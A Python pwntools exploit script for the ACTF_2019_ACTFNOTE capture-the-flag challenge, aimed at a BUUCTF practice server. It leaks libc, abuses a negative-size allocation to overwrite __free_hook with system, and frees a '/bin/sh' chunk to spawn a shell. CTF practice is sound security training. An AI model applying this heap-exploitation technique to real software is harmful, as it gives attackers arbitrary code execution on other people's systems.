# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ACTF_2019_ACTFNOTE'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29830'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('/$ ',num)

def add(size , name, text):
    cmd(1)
    sla('size:' , size)
    sa('name:' , name)
    sa('content:' , text)


def edit(idx, text):
    cmd(2)
    sla('id:' , idx)
    sa('content:' , text)

def delete(idx):
    cmd(3)
    sla('id:' , idx)

def show(idx):
    cmd(4)
    sla('id:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x18 , 'a'*0x18 , 'b'*0x18)
    add(0x18 , 'a'*0x18 , 'a'*0x8)

    show(0)
    libc.address = l64() - 0x8e3f2
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)
    # delete(1)
    add(0x18 , 'a'*0x18 , 'b'*0x8)

    edit(2,'b'*0x10 + p64(0) + '\xff'*0x8)

    add(-0x80,p64(__free_hook - 8),'')
    # 负数分配到 top chunk 上方，是我们使用的某一个堆块
    # 向索引处写上 __free_hook 的地址

    edit(2 , flat('/bin/sh\x00' , system_addr))
    delete(2)

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ACTF_2019_ACTFNOTE.py
@Time    :   2022/02/06 12:20:07
@Author  :   Niyah 
'''